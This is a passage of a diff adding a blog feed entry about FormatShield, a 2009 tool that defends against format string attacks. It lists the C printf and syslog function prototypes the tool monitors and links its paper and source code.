+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vfprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsnprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...)&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vsyslog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;va_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On detecting an attack, the victim process is killed and a log is written to syslog. More details about the inner working of FormatShield are available in the &lt;a href=&quot;/assets/files/formatshield-acisp08.pdf&quot;&gt;research paper&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/pank4j/formatshield&quot;&gt;Formatshield source&lt;/a&gt; is licensed as GNU GPL v3 and is archived on github. It is available only for testing/research, please use it at your own risk.&lt;/p&gt;
+
+    &lt;p&gt;&lt;a href=&quot;/posts/formatshield.html&quot;&gt;FormatShield: A tool to defend against format string attacks&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on June 30, 2009.&lt;/p&gt;
+  </content>
+</entry>
+
+</feed>
